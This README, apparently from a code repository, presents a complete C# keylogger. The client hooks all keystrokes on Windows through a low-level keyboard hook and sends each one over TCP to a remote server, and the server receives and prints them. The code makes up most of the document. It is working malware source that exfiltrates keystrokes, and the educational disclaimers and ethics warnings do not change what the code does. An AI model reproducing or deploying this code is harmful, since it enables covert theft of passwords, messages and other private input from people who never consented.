# 🥷🏻 Keylogger in Csharp
This project consists of two parts: KeyloggerServer and KeyloggerClient. The KeyloggerServer listens for key logs sent from the KeyloggerClient and prints them to the console. The KeyloggerClient captures keystrokes on the host machine and sends them to the server.

### Introduction
The KeyloggerServer and KeyloggerClient projects demonstrate a simple implementation of a keylogger and a corresponding server to capture keystrokes remotely. This setup is intended for educational purposes to understand the mechanics of keylogging and network communication in C#.

## ⚠️ Warning
Unauthorized use of keyloggers to capture keystrokes from systems without consent is illegal and unethical. This project should only be used in environments where you have explicit permission to do so, such as your own devices for educational or testing purposes.

## Project Structure
```
KeyloggerProject
│
├─── KeyloggerServer
│    ├── Program.cs
│    ├── .vscode
│    │   ├── launch.json
│    │   ├── tasks.json
│    ├── KeyloggerServer.csproj
│
└─── KeyloggerClient
     ├── Program.cs
     ├── Keylogger.cs
     ├── .vscode
     │   ├── launch.json
     │   ├── tasks.json
     ├── KeyloggerClient.csproj
```

## Getting Started
### Prerequisites
- .NET SDK (version 6.0 or higher)
- Visual Studio Code with the C# extension installed

## Technical Details
### KeyloggerServer
The server is a simple TCP listener that waits for incoming connections on port 5000. When a connection is received, it reads the data, interprets it as a keystroke, and prints it to the console.

### Program.cs:
```csharp
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

class Server
{
    static void Main()
    {
        TcpListener server = new TcpListener(IPAddress.Any, 5000);
        server.Start();
        Console.WriteLine("Server started...");

        while (true)
        {
            TcpClient client = server.AcceptTcpClient();
            NetworkStream stream = client.GetStream();

            byte[] buffer = new byte[1024];
            int bytesRead = stream.Read(buffer, 0, buffer.Length);
            string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            Console.WriteLine("Received: " + message);

            client.Close();
        }
    }
}
```

### KeyloggerClient
The client sets a low-level keyboard hook to capture all keystrokes. Captured keystrokes are sent to the server over a TCP connection.

### Program.cs:

```csharp
using System;
using System.Windows.Forms;

namespace KeyloggerClient
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Keylogger.Start();
            Application.Run();
        }
    }
}
```

### Keylogger.cs:

```csharp
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyloggerClient
{
    static class Keylogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static void Start()
        {
            _hookID = SetHook(_proc);
            Application.ApplicationExit += (sender, e) => UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                SendKeyToServer(key);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void SendKeyToServer(string key)
        {
            try
            {
                using (TcpClient client = new TcpClient("server-ip-address", 5000)) // Use the server's IP address
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] data = System.Text.Encoding.ASCII.GetBytes(key);
                    stream.Write(data, 0, data.Length);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception: " + ex.Message);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
```

### Security Considerations
- Ethical Use: Ensure you have explicit permission to use keylogging software on any device. Unauthorized use is illegal and unethical.
- Data Privacy: Keylogging software can capture sensitive information. Handle all captured data securely and ensure it is protected from unauthorized access.
- Network Security: Use secure communication channels if deploying over the internet to avoid interception of keystrokes.
